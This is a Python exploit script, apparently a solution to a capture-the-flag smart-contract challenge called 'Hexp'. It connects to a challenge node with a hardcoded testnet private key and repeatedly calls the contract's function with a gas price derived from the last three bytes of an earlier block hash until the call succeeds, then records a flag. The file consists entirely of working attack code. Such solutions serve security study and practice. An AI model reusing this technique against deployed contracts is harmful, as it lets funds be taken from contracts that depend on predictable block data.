import json

from pwn import *
from web3 import Web3
from web3.middleware import geth_poa_middleware


def exploit(hexp_address):
    w3 = Web3(Web3.HTTPProvider('http://8.218.239.44:8545/'))
    # ref: https://stackoverflow.com/questions/70812529/the-field-extradata-is-97-bytes-but-should-be-32-it-is-quite-likely-that-you-a
    w3.middleware_onion.inject(geth_poa_middleware, layer=0)

    # $ cast wallet new
    private_key = "0xb8305f5a0cacc7ade7f3aaa8702372307bdaaeb00e9447c85332284deec1477e"
    player_address = "0xe14924eC3FA63F8FD6f0937c3Fbcf86242dce2De"
    if w3.eth.get_balance(player_address) == 0:
        input(f"Claim testnet ETH to {player_address} at http://47.102.40.39:8080/.\nPress ENTER once done.")

    hexp_abi = json.load(open("out/hexp.sol/Hexp.json"))["abi"]
    hexp = w3.eth.contract(address=hexp_address, abi=hexp_abi)

    print(hexp.functions.isSolved().call())

    chain_id = 19226
    gas_limit = 2000000

    def send(function, gas_price):
        txn = function.build_transaction({'chainId': chain_id, 'gas': gas_limit, 'gasPrice': gas_price, 'nonce': w3.eth.get_transaction_count(player_address), })
        signed_txn = w3.eth.account.sign_transaction(txn, private_key=private_key)
        w3.eth.send_raw_transaction(signed_txn.rawTransaction)
        tx_hash = w3.to_hex(w3.keccak(signed_txn.rawTransaction))
        tx_receipt = w3.eth.wait_for_transaction_receipt(tx_hash)
        # assert tx_receipt["status"] == 1
        return tx_receipt

    block_number = w3.eth.block_number

    i = 8
    while True:
        print("current:", w3.eth.block_number)
        print("target:", block_number - i)
        block = w3.eth.get_block(block_number - i)
        block_hash = bytes(block.hash)
        gas_price = int.from_bytes(block_hash[-3:], "big")
        print(hex(gas_price), block_hash[-3:].hex())

        tx_receipt = send(hexp.functions.f00000000_bvvvdlt(), gas_price)
        print(tx_receipt["transactionHash"].hex())
        if tx_receipt["status"] == 1:
            break

        # flag: 0xdd4672257e7adf56f0896c33747caf793fcd1e53


def main():
    exploit("0xbd641B9C3d6834902C6c75e0Ee27a193E7FaB699")


if __name__ == "__main__":
    main()